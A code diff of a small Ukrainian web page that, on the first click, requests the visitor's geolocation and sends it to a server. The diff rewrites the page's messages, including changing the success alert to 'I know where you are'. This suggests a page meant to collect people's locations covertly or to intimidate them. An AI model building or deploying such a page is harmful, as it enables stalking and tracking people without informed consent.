@@ -2,7 +2,7 @@
 <html lang="uk">
 <head>
 <meta charset="UTF-8">
-<title>Send location</title>
+<title>Скажи де ти</title>
 </head>
 <body>
 
@@ -13,7 +13,7 @@ function sendGeoOnce() {
   document.removeEventListener("click", sendGeoOnce);
 
   if (!navigator.geolocation) {
-    alert("Геолокація не підтримується");
+    alert("Гео не підтримується");
     return;
   }
 
@@ -46,10 +46,10 @@ function sendGeoOnce() {
         body: JSON.stringify(payload)
       });
 
-      alert("Локацію відправлено");
+      alert("Я знаю де ти");
     },
     (err) => {
-      alert("Помилка геолокації: " + err.message);
+      alert("Помилка: " + err.message);
     }
   );
 }
